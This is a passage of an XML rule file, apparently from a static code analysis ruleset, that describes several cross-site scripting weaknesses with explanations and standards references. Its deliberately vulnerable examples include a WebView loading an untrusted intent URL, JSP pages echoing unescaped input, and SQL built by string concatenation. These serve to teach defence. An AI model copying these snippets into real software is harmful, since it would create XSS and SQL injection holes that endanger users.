																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 79, CWE ID 82, CWE ID 83, CWE ID 87, CWE ID 692</em> <br></p>
																									   <p>[12]  <em>HTML 4.01 Specification</em> W3<br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 116</em> <br></p>
																									   <p>[16] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-18 Mobile Code (P2)</em> <br></p>
																									   <p>[22] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[23]  <em>Understanding Malicious Content Mitigation for Web Developers</em> CERT<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_cross_site_scripting_inter_component_communication
		</key>
		<internalKey>Input Validation and Representation/Cross-Site
			Scripting/Inter-Component Communication
		</internalKey>
		<name>Cross-Site Scripting: Inter-Component Communication</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Sending unvalidated data to a web browser can result in the browser executing malicious code.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Cross-site scripting (XSS) vulnerabilities occur when:<br><br>1. Data enters a web application through an untrusted source. In the case of Inter-Component Communication XSS, the untrusted source is data received from other components that reside on the same system. In the mobile world, these are applications running on the same device. In the case of Reflected XSS, the untrusted source is typically a web request, while in the case of Persisted (also known as Stored) XSS it is typically a database or other back-end datastore.<br><br><br>2. The data is included in dynamic content that is sent to a web user without being validated.<br><br>The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.<br><br>Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.<br><br><b>Example 1:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent.<br><br><pre><br>...<br>        WebView webview = (WebView) findViewById(R.id.webview);<br>        webview.getSettings().setJavaScriptEnabled(true);<br>        String url = this.getIntent().getExtras().getString("url");<br>        webview.loadUrl(url);<br>...<br></pre><br><br>If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView.<br><br><IfNotDef var="ConditionalDescriptions"><br><b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user.<br><br><pre><br>&lt;% String eid = request.getParameter("eid"); %&gt;<br>...<br>Employee ID: &lt;%= eid %&gt;<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"></IfDef><br><br>The code in this example operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response.<br><br>Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.<br><br><IfNotDef var="ConditionalDescriptions"><br><b>Example 3:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.<br><br><pre><br>&lt;%...<br>Statement stmt = conn.createStatement();<br>ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);<br>if (rs != null) {<br>   rs.next();<br>   String name = rs.getString("name");<br>}<br>%&gt;<br><br>Employee Name: &lt;%= name %&gt;<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"></IfDef><br><br>As in Example 2, this code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a "guestbook" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.<br><br>As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:<br><br>- As in Example 1, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.<br><br>- As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities.<br><br>- As in Example 3, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.<br><br><IfDef var="ConditionalDescriptions"></IfDef><br><IfNotDef var="ConditionalDescriptions"><br>A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HP Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HP Fortify user with the auditing process, the HP Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.<br></IfNotDef>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A1 Cross Site Scripting (XSS)</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A2 Cross-Site Scripting (XSS)</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A3 Cross-Site Scripting (XSS)</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A4 Cross Site Scripting</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[10] Tongbo Luo, Hao Hao, Wenliang Du, Yifei Wang, and Heng Yin <em>Attacks on WebView in the Android System</em> <br></p>
																									   <p>[11] Erika Chin and David Wagner <em>Bifocals: AnalyzingWebView Vulnerabilities in Android Applications</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Cross-site Scripting</em> <br></p>
																									   <p>[13] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 79, CWE ID 80</em> <br></p>
																									   <p>[14]  <em>HTML 4.01 Specification</em> W3<br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[17] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[18] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.1</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[23] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[24] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[25]  <em>Understanding Malicious Content Mitigation for Web Developers</em> CERT<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_cross_site_scripting_persistent
		</key>
		<internalKey>Input Validation and Representation/Cross-Site
			Scripting/Persistent
		</internalKey>
		<name>Cross-Site Scripting: Persistent</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Sending unvalidated data to a web browser can result in the browser executing malicious code.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Cross-site scripting (XSS) vulnerabilities occur when:<br><br>1. Data enters a web application through an untrusted source. In the case of Persistent (also known as Stored) XSS, the untrusted source is typically a database or other back-end datastore, while in the case of Reflected XSS it is typically a web request.<br><br><br>2. The data is included in dynamic content that is sent to a web user without being validated.<br><br>The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.<br><br><IfNotDef var="ConditionalDescriptions"><br><b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.<br><br><pre><br>&lt;%...<br>Statement stmt = conn.createStatement();<br>ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);<br>if (rs != null) {<br>   rs.next();<br>   String name = rs.getString("name");<br>}<br>%&gt;<br><br>Employee Name: &lt;%= name %&gt;<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"></IfDef><br><br>This code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. This code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a "guestbook" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.<br><br><IfNotDef var="ConditionalDescriptions"><br><b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user.<br><br><pre><br>&lt;% String eid = request.getParameter("eid"); %&gt;<br>...<br>Employee ID: &lt;%= eid %&gt;<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"></IfDef><br><br>As in Example 1, this code operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response.<br><br>Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.<br><br>Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.<br><br><b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent.<br><br><pre><br>...<br>        WebView webview = (WebView) findViewById(R.id.webview);<br>        webview.getSettings().setJavaScriptEnabled(true);<br>        String url = this.getIntent().getExtras().getString("url");<br>        webview.loadUrl(url);<br>...<br></pre><br><br>If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView.<br><br>As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:<br><br>- As in Example 1, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.<br><br>- As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities.<br><br>- As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.<br><br><IfDef var="ConditionalDescriptions"></IfDef><br><IfNotDef var="ConditionalDescriptions"><br>A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HP Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HP Fortify user with the auditing process, the HP Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.<br></IfNotDef>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A1 Cross Site Scripting (XSS)</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A2 Cross-Site Scripting (XSS)</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A3 Cross-Site Scripting (XSS)</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A4 Cross Site Scripting</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[10] Tongbo Luo, Hao Hao, Wenliang Du, Yifei Wang, and Heng Yin <em>Attacks on WebView in the Android System</em> <br></p>
																									   <p>[11] Erika Chin and David Wagner <em>Bifocals: AnalyzingWebView Vulnerabilities in Android Applications</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Cross-site Scripting</em> <br></p>
																									   <p>[13] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 79, CWE ID 80</em> <br></p>
																									   <p>[14]  <em>HTML 4.01 Specification</em> W3<br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[17] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[18] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.1</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[23] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[24] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[25]  <em>Understanding Malicious Content Mitigation for Web Developers</em> CERT<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_cross_site_scripting_poor_validation
		</key>
		<internalKey>Input Validation and Representation/Cross-Site
			Scripting/Poor Validation
		</internalKey>
		<name>Cross-Site Scripting: Poor Validation</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Relying on HTML, XML and other types of encoding to validate user input can result in the browser executing malicious code.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The use of certain encoding constructs, such as the <code>&lt;c:out/&gt;</code> tag with the <code>escapeXml="true"</code> attribute (the default behavior), will prevent some, but not all cross-site scripting attacks. Depending on the context in which the data appear, characters beyond the basic &lt;, &gt;, &amp;, and " that are HTML-encoded and those beyond &lt;, &gt;, &amp;, ", and ' that are XML-encoded may take on meta-meaning. Relying on such encoding constructs is equivalent to using a weak blacklist to prevent cross-site scripting and might allow an attacker to inject malicious code that will be executed in the browser. Because accurately identifying the context in which the data appear statically is not always possible, HP Fortify Static Code Analyzer reports cross-site scripting findings even when encoding is applied and presents them as Cross-Site Scripting: Poor Validation issues.<br><br>Cross-site scripting (XSS) vulnerabilities occur when:<br><br>1. Data enters a web application through an untrusted source. In the case of Reflected XSS, an untrusted source is most frequently a web request, and in the case of Persistent (a.k.a. Stored) XSS -- it is the results of a database query.<br><br><br>2. The data is included in dynamic content that is sent to a web user without being validated.<br><br>The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.<br><br><IfNotDef var="ConditionalDescriptions"><br><b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user via the <code>&lt;c:out/&gt;</code> tag.<br><br><pre><br>Employee ID: &lt;c:out value="${param.eid}"/&gt;<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"></IfDef><br><br>The code in this example operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response.<br><br>Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.<br><br><IfNotDef var="ConditionalDescriptions"><br><b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the <code>&lt;c:out/&gt;</code> tag.<br><br><pre><br>&lt;%...<br>Statement stmt = conn.createStatement();<br>ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);<br>if (rs != null) {<br>   rs.next();<br>   String name = rs.getString("name");<br>}<br>%&gt;<br><br>Employee Name: &lt;c:out value="${name}"/&gt;<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"></IfDef><br><br>As in Example 1, this code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a "guestbook" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.<br><br>Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.<br><br><b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent.<br><br><pre><br>...<br>        WebView webview = (WebView) findViewById(R.id.webview);<br>        webview.getSettings().setJavaScriptEnabled(true);<br>        String url = this.getIntent().getExtras().getString("url");<br>        webview.loadUrl(URLEncoder.encode(url));<br>...<br></pre><br><br>If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView.<br><br>As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:<br><br>- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities.<br><br>- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.<br><br>- As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.<br><br><IfDef var="ConditionalDescriptions"></IfDef><br><IfNotDef var="ConditionalDescriptions"><br>A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HP Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HP Fortify user with the auditing process, the HP Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.<br></IfNotDef>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A1 Cross Site Scripting (XSS)</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A2 Cross-Site Scripting (XSS)</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A3 Cross-Site Scripting (XSS)</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A4 Cross Site Scripting</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[10] Tongbo Luo, Hao Hao, Wenliang Du, Yifei Wang, and Heng Yin <em>Attacks on WebView in the Android System</em> <br></p>
																									   <p>[11] Erika Chin and David Wagner <em>Bifocals: AnalyzingWebView Vulnerabilities in Android Applications</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Cross-site Scripting, Content Spoofing</em> <br></p>
																									   <p>[13] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 82, CWE ID 83, CWE ID 87, CWE ID 692</em> <br></p>
																									   <p>[14]  <em>HTML 4.01 Specification</em> W3<br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 116</em> <br></p>
																									   <p>[16] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[21] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[22] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[23]  <em>Understanding Malicious Content Mitigation for Web Developers</em> CERT<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_cross_site_scripting_reflected
		</key>
		<internalKey>Input Validation and Representation/Cross-Site
			Scripting/Reflected
		</internalKey>
		<name>Cross-Site Scripting: Reflected</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Sending unvalidated data to a web browser can result in the browser executing malicious code.
							</p>
							<h2>EXPLANATION</h2>
							<p>
